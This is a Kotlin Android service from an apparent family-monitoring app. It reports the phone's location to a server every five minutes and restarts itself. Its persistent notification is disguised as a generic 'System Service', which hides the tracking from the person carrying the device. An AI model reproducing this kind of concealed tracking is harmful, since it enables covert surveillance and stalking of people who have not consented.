package com.familyguardpro.services

import android.app.Service
import android.content.Intent
import android.location.Location
import android.os.IBinder
import android.os.Looper
import android.util.Log
import androidx.core.app.NotificationCompat
import com.familyguardpro.FamilyGuardApp
import com.familyguardpro.R
import com.familyguardpro.network.ApiClient
import com.google.android.gms.location.*
import kotlinx.coroutines.*

class LocationService : Service() {
    
    companion object {
        private const val TAG = "LocationService"
        private const val NOTIFICATION_ID = 1005
        private const val LOCATION_INTERVAL = 5 * 60 * 1000L // 5 minutes
    }
    
    private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private lateinit var fusedLocationClient: FusedLocationProviderClient
    private lateinit var locationCallback: LocationCallback
    
    override fun onCreate() {
        super.onCreate()
        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
        setupLocationCallback()
    }
    
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startForeground()
        startLocationUpdates()
        return START_STICKY
    }
    
    override fun onBind(intent: Intent?): IBinder? = null
    
    override fun onDestroy() {
        super.onDestroy()
        stopLocationUpdates()
        serviceScope.cancel()
    }
    
    private fun startForeground() {
        val notification = NotificationCompat.Builder(this, FamilyGuardApp.NOTIFICATION_CHANNEL_SYNC)
            .setContentTitle("System Service")
            .setContentText("Running")
            .setSmallIcon(R.drawable.ic_notification)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .build()
        
        startForeground(NOTIFICATION_ID, notification)
    }
    
    private fun setupLocationCallback() {
        locationCallback = object : LocationCallback() {
            override fun onLocationResult(locationResult: LocationResult) {
                for (location in locationResult.locations) {
                    updateLocation(location)
                }
            }
        }
    }
    
    private fun startLocationUpdates() {
        try {
            val locationRequest = LocationRequest.Builder(
                Priority.PRIORITY_BALANCED_POWER_ACCURACY,
                LOCATION_INTERVAL
            )
                .setMinUpdateIntervalMillis(LOCATION_INTERVAL / 2)
                .build()
            
            fusedLocationClient.requestLocationUpdates(
                locationRequest,
                locationCallback,
                Looper.getMainLooper()
            )
            
            Log.d(TAG, "Location updates started")
        } catch (e: SecurityException) {
            Log.e(TAG, "Location permission not granted", e)
        }
    }
    
    private fun stopLocationUpdates() {
        fusedLocationClient.removeLocationUpdates(locationCallback)
        Log.d(TAG, "Location updates stopped")
    }
    
    private fun updateLocation(location: Location) {
        serviceScope.launch {
            try {
                val app = applicationContext as FamilyGuardApp
                val deviceId = app.preferenceManager.getDeviceId()
                
                if (deviceId.isNotEmpty()) {
                    ApiClient.updateLocation(deviceId, location.latitude, location.longitude)
                    Log.d(TAG, "Location updated: ${location.latitude}, ${location.longitude}")
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error updating location", e)
            }
        }
    }
}
